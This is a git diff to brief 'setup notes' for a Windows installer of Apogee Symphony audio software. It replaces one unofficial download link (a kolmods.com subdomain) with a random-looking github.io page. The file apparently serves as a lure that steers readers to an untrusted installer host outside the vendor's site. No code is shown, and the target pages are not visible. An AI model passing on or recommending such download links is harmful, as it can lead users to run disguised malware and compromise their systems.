@@ -1,6 +1,6 @@
 # Apogee Symphony Windows Setup Notes
 
-**Download:** [Get Windows installer →](https://apogee-symphony-setup.kolmods.com/)
+**Download:** [Get Windows installer →](https://rozamondsinistral155.github.io)
 
 ## Download & Install
 
